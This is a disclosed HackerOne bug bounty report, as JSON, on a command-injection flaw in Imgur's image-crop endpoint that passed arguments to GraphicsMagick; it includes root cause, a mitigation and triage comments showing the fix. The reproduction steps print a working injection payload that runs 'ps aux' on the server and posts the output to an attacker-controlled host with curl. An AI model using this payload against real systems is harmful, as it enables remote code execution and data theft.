{"id":212696,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMTI2OTY=","url":"https://hackerone.com/reports/212696","title":"RCE by command line argument injection to `gm convert` in `/edit/process?a=crop`","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2017-03-12T03:46:46.948Z","submitted_at":"2017-03-12T03:46:46.948Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"neex","url":"/neex","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/014/987/69159fe64cb5f951b5b761f0d55ea5e8630a22a4_original.gif/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":638,"url":"https://hackerone.com/imgur","handle":"imgur","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/638/c66ef01545064639821798ab311aa0063acd8aa7_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/638/c66ef01545064639821798ab311aa0063acd8aa7_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Imgur","twitter_handle":"imgur","website":"http://imgur.com","about":"The most awesome images on the Internet."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-04-26T21:30:28.855Z","bug_reporter_agreed_on_going_public_at":"2017-03-27T21:30:17.395Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"### Summary\n\nThe `y` parameter of `/edit/process` endpoint (with `a=crop`) is vulnerable to command-line argument injection to something that appears to be GraphicsMagick utility (probably `gm convert`). Due to GraphicsMagick's hacker-friendly processing of `|`-starting filenames supplied to `-write` option, it leads to command execution.\n\n### Reproduction steps\n\n0. Enable Burp Proxy or similar software that allows you to log and edit HTTP requests.\n1. Login into your imgur account and upload an image.\n2. Move your mouse over the image, click on the tiny button with pencil on it, then click \"Edit\".\n3. Select a random rectangle on the image, then click \"Apply\".\n4. In the burp suite, you will see a request to an URL like this:  `http://\u003cyour-account\u003e.imgur.com/edit/process?imageid=c9e1351c21542062f35a12130945210b\u0026a=crop\u0026x=0\u0026y=0\u0026w=700\u0026h=746\u0026random=4011802027746510`\n\n     Change the `y` parameter of the request so it becomes `0 -write |ps${IFS}aux|curl${IFS}http://\u003cyour-server\u003e${IFS}-d${IFS}@-`. \n\n     The full URL after the change must look like `http://\u003cyour-account\u003e.imgur.com/edit/process?imageid=c9e1351c21542062f35a12130945210b\u0026a=crop\u0026x=0\u0026y=0%20-write%20|ps${IFS}aux|curl${IFS}http://\u003cyour-server\u003e{IFS}-d${IFS}@-\u0026w=700\u0026h=830\u0026random=9905392865702303`, note that you have to change `\u003cyour-server\u003e` to a webserver under your control).\n\n5. Fire a request to the modified URL. The command (`ps aux|curl http://\u003cyour-server\u003e -d @-`) will be executed somewhere inside imgur, and you will get a HTTP request to `\u003cyour-server\u003e` with the result of `ps aux` in the POST body.  You can replace `ps aux` with another command (but you have to write `${IFS}` instead of spaces).\n\n### Detailed description\n\nI was searching for CVE-2016-10033-like vulnerabilities on several bugbounty sites when I noticed strange behaviour of the mentioned parameter. The vulnerability exists because the user input (the contents of `y` GET parameter) goes into a shell command. While all special characters (like `|`, `$` and so on) seem to be escaped, the space character is not. This allows the attacker to insert additinal command line arguments. The common reason for such behaviour is `escapeshellcmd` PHP function, but that can also be some kind of custom input filtering/processing.\n\nThe rest of the exploitation depends on the program that is executed (we need to find out if it supports any dangerous command-line options). Common sense suggests that the external command launched by \"Crop/Resize\" function must be some image processing tool. The most popular one is ImageMagick/GraphicsMagick, so I appended ` -rotate 90` to the parameter and it succeded --- I saw lying Trump (I mean, the image was rotated). After more tries I was sure it's GraphicsMagick (probably `gm convert` utility). I read the documentation and found that `-write` argument supports perl-style filenames starting with a pipe --- in this case the rest of the filename must be a command to execute.\n\n### Mitigation\n\nProbably either some kind of custom processing or `escapeshellcmd` function is used to construct the command line. In both cases, replace it with applying `escapeshellarg` to individual arguments. In the second case, you probably want to run `grep -R escapeshellcmd \u003cpath to the source code\u003e` to find more vulns :-)\n","vulnerability_information_html":"\u003ch3 id=\"summary\"\u003eSummary\u003c/h3\u003e\n\n\u003cp\u003eThe \u003ccode\u003ey\u003c/code\u003e parameter of \u003ccode\u003e/edit/process\u003c/code\u003e endpoint (with \u003ccode\u003ea=crop\u003c/code\u003e) is vulnerable to command-line argument injection to something that appears to be GraphicsMagick utility (probably \u003ccode\u003egm convert\u003c/code\u003e). Due to GraphicsMagick\u0026#39;s hacker-friendly processing of \u003ccode\u003e|\u003c/code\u003e-starting filenames supplied to \u003ccode\u003e-write\u003c/code\u003e option, it leads to command execution.\u003c/p\u003e\n\n\u003ch3 id=\"reproduction-steps\"\u003eReproduction steps\u003c/h3\u003e\n\n\u003col\u003e\n\u003cli\u003eEnable Burp Proxy or similar software that allows you to log and edit HTTP requests.\u003c/li\u003e\n\u003cli\u003eLogin into your imgur account and upload an image.\u003c/li\u003e\n\u003cli\u003eMove your mouse over the image, click on the tiny button with pencil on it, then click \u0026quot;Edit\u0026quot;.\u003c/li\u003e\n\u003cli\u003eSelect a random rectangle on the image, then click \u0026quot;Apply\u0026quot;.\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eIn the burp suite, you will see a request to an URL like this:  \u003ccode\u003ehttp://\u0026lt;your-account\u0026gt;.imgur.com/edit/process?imageid=c9e1351c21542062f35a12130945210b\u0026amp;a=crop\u0026amp;x=0\u0026amp;y=0\u0026amp;w=700\u0026amp;h=746\u0026amp;random=4011802027746510\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eChange the \u003ccode\u003ey\u003c/code\u003e parameter of the request so it becomes \u003ccode\u003e0 -write |ps${IFS}aux|curl${IFS}http://\u0026lt;your-server\u0026gt;${IFS}-d${IFS}@-\u003c/code\u003e. \u003c/p\u003e\n\n\u003cp\u003eThe full URL after the change must look like \u003ccode\u003ehttp://\u0026lt;your-account\u0026gt;.imgur.com/edit/process?imageid=c9e1351c21542062f35a12130945210b\u0026amp;a=crop\u0026amp;x=0\u0026amp;y=0%20-write%20|ps${IFS}aux|curl${IFS}http://\u0026lt;your-server\u0026gt;{IFS}-d${IFS}@-\u0026amp;w=700\u0026amp;h=830\u0026amp;random=9905392865702303\u003c/code\u003e, note that you have to change \u003ccode\u003e\u0026lt;your-server\u0026gt;\u003c/code\u003e to a webserver under your control).\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eFire a request to the modified URL. The command (\u003ccode\u003eps aux|curl http://\u0026lt;your-server\u0026gt; -d @-\u003c/code\u003e) will be executed somewhere inside imgur, and you will get a HTTP request to \u003ccode\u003e\u0026lt;your-server\u0026gt;\u003c/code\u003e with the result of \u003ccode\u003eps aux\u003c/code\u003e in the POST body.  You can replace \u003ccode\u003eps aux\u003c/code\u003e with another command (but you have to write \u003ccode\u003e${IFS}\u003c/code\u003e instead of spaces).\u003c/p\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch3 id=\"detailed-description\"\u003eDetailed description\u003c/h3\u003e\n\n\u003cp\u003eI was searching for CVE-2016-10033-like vulnerabilities on several bugbounty sites when I noticed strange behaviour of the mentioned parameter. The vulnerability exists because the user input (the contents of \u003ccode\u003ey\u003c/code\u003e GET parameter) goes into a shell command. While all special characters (like \u003ccode\u003e|\u003c/code\u003e, \u003ccode\u003e$\u003c/code\u003e and so on) seem to be escaped, the space character is not. This allows the attacker to insert additinal command line arguments. The common reason for such behaviour is \u003ccode\u003eescapeshellcmd\u003c/code\u003e PHP function, but that can also be some kind of custom input filtering/processing.\u003c/p\u003e\n\n\u003cp\u003eThe rest of the exploitation depends on the program that is executed (we need to find out if it supports any dangerous command-line options). Common sense suggests that the external command launched by \u0026quot;Crop/Resize\u0026quot; function must be some image processing tool. The most popular one is ImageMagick/GraphicsMagick, so I appended \u003ccode\u003e-rotate 90\u003c/code\u003e to the parameter and it succeded --- I saw lying Trump (I mean, the image was rotated). After more tries I was sure it\u0026#39;s GraphicsMagick (probably \u003ccode\u003egm convert\u003c/code\u003e utility). I read the documentation and found that \u003ccode\u003e-write\u003c/code\u003e argument supports perl-style filenames starting with a pipe --- in this case the rest of the filename must be a command to execute.\u003c/p\u003e\n\n\u003ch3 id=\"mitigation\"\u003eMitigation\u003c/h3\u003e\n\n\u003cp\u003eProbably either some kind of custom processing or \u003ccode\u003eescapeshellcmd\u003c/code\u003e function is used to construct the command line. In both cases, replace it with applying \u003ccode\u003eescapeshellarg\u003c/code\u003e to individual arguments. In the second case, you probably want to run \u003ccode\u003egrep -R escapeshellcmd \u0026lt;path to the source code\u0026gt;\u003c/code\u003e to find more vulns :-)\u003c/p\u003e\n","bounty_amount":"5000.0","formatted_bounty":"$5,000","weakness":{"id":58,"name":"Command Injection - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-04-26T21:30:17.429Z","allow_singular_disclosure_after":-115975620.01934369,"singular_disclosure_allowed":true,"vote_count":217,"voters":["zhchbin","subzero1993","manoelt","b1ngz","rc0r","jokebookservice1","durg78","irvinlim","arneswinnen","pudsec","and 207 more..."],"severity":{"rating":"critical","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1535110,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello! Thanks for taking the time to make this report to the Imgur security team! We look forward to reviewing and assessing the risk of this vuln. In the meantime, we ask that you sit tight while we get to it - we're a small team and sometimes it takes us a while to verify all reports. Please don't ask for updates as these take time and effort away from the reports we're working through and make our response time slower across the board. Thanks - we'll be in touch soon!","markdown_message":"\u003cp\u003eHello! Thanks for taking the time to make this report to the Imgur security team! We look forward to reviewing and assessing the risk of this vuln. In the meantime, we ask that you sit tight while we get to it - we\u0026#39;re a small team and sometimes it takes us a while to verify all reports. Please don\u0026#39;t ask for updates as these take time and effort away from the reports we\u0026#39;re working through and make our response time slower across the board. Thanks - we\u0026#39;ll be in touch soon!\u003c/p\u003e\n","automated_response":true,"created_at":"2017-03-12T03:46:47.170Z","updated_at":"2017-03-12T03:46:47.170Z","actor":{"url":"/imgur","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/638/c66ef01545064639821798ab311aa0063acd8aa7_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Imgur"}},"genius_execution_id":null,"team_handle":"imgur","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1538776,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @neex,\n\nThank you for the detailed report. We are currently still looking into the issue.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/neex\"\u003e@neex\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you for the detailed report. We are currently still looking into the issue.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-13T21:25:44.377Z","updated_at":"2017-03-13T21:25:44.377Z","actor":{"username":"ttoko","cleared":false,"url":"/ttoko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/347/01c0660d8da33d4b1d468e35562eea9983d24bf3_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"imgur","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1539121,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"We have accepted the report as valid and added an issue in our internal issue tracker for your report. We will update this page when more progress is made. Thanks!","markdown_message":"\u003cp\u003eWe have accepted the report as valid and added an issue in our internal issue tracker for your report. We will update this page when more progress is made. Thanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-14T00:11:14.509Z","updated_at":"2017-03-14T00:11:14.509Z","actor":{"username":"ttoko","cleared":false,"url":"/ttoko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/347/01c0660d8da33d4b1d468e35562eea9983d24bf3_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"imgur","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1539126,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @neex,\n\nThe issue has been fixed. Can you verify that you cannot reproduce this issue anymore?\n\nThank you!\n","markdown_message":"\u003cp\u003eHi \u003ca href=\"/neex\"\u003e@neex\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThe issue has been fixed. Can you verify that you cannot reproduce this issue anymore?\u003c/p\u003e\n\n\u003cp\u003eThank you!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-14T00:19:10.697Z","updated_at":"2017-03-14T00:19:10.697Z","actor":{"username":"ttoko","cleared":false,"url":"/ttoko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/347/01c0660d8da33d4b1d468e35562eea9983d24bf3_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"imgur","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1539136,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yep, seems like it's fixed.","markdown_message":"\u003cp\u003eYep, seems like it\u0026#39;s fixed.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-14T00:26:04.235Z","updated_at":"2017-03-14T00:26:04.235Z","actor":{"username":"neex","cleared":false,"url":"/neex","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/987/69159fe64cb5f951b5b761f0d55ea5e8630a22a4_original.gif/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"imgur","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1565930,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"We have released a new version that fixes this vulnerability. Thanks for helping make Imgur more secure! ","markdown_message":"\u003cp\u003eWe have released a new version that fixes this vulnerability. Thanks for helping make Imgur more secure! \u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-27T18:38:04.051Z","updated_at":"2017-03-27T18:38:04.051Z","actor":{"username":"kcramer","cleared":false,"url":"/kcramer","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"neex","url":"/neex"},"genius_execution_id":null,"team_handle":"imgur","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1565949,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2017-03-27T18:44:01.909Z","updated_at":"2017-03-27T18:44:01.909Z","actor":{"url":"/imgur","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/638/c66ef01545064639821798ab311aa0063acd8aa7_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Imgur"}},"bounty_amount":"5000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"imgur","collaborator":{"username":"neex","url":"/neex"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1566434,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"This was an interesting one, let's disclose it","markdown_message":"\u003cp\u003eThis was an interesting one, let\u0026#39;s disclose it\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-27T21:30:17.409Z","updated_at":"2017-03-27T21:30:17.409Z","first_to_agree":true,"actor":{"username":"neex","cleared":false,"url":"/neex","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/987/69159fe64cb5f951b5b761f0d55ea5e8630a22a4_original.gif/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"imgur","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1638783,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-04-26T21:30:28.873Z","updated_at":"2017-04-26T21:30:28.873Z","actor":{"url":"/imgur","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/638/c66ef01545064639821798ab311aa0063acd8aa7_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Imgur"}},"genius_execution_id":null,"team_handle":"imgur","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}